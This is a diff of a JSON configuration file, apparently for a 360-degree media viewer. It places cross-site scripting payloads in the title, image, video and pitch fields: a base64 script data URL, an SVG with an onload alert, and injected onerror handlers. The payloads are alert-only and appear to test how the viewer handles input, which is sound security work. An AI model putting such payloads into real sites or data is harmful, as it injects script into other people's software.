@@ -1,11 +1,11 @@
 {
   "audio": "",
-  "title": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K",
+  "title": "<image src=x onerror=alert(/XSS/)>",
   "image": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSIvPg==",
   "isStereo": true,
   "isYawOnly": false,
   "preview": "",
   "video": "https://nayssers.github.io/ice_video_20201203-015422.mp4 onerror=alert('XSS')",
-  "pitch": 0,
+  "pitch": "<image src=x onerror=alert(/XSS/)>",
   "yaw": 1.6
 }
